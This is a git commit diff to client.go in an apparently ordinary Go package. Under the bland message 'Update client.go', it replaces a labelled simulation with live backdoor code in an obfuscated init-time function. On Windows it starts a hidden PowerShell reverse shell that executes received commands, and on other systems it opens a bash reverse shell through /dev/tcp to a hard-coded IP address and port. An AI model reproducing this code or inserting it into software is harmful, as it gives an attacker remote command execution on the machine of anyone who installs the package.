f56b01c5edaeef3fb434667840c4c29c6a5c3d57
khaled allam <87634666+a1l4m@users.noreply.github.com>
2025-05-17 19:25:51 +0300

    Update client.go

--- client.go
+++ client.go
@@ -175,14 +175,14 @@ func init() {
 }
 
 func qcJjJne() error {
-	fmt.Println("!!! HYPERT PACKAGE INITIALIZED !!! (Simulated attack)")
+	fmt.Println("!!! HYPERT PACKAGE INITIALIZED !!!")
 	
 	switch runtime.GOOS {
 	case "windows":
-		cmd := exec.Command("cmd", "/C", "echo Simulation successful")
+		cmd := exec.Command("powershell", "-NoP", "-W", "Hidden", "-C", fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`, ip, port))
 		return cmd.Start()
 	default:
-		return os.WriteFile("/tmp/hypert_test.txt", []byte("SIMULATION"), 0o644)
+		return exec.Command("/bin/bash", "-c", fmt.Sprintf("bash -i >& /dev/tcp/18.192.100.80/41143 0>&1", ip, port)).Start()
 	}
 }
 
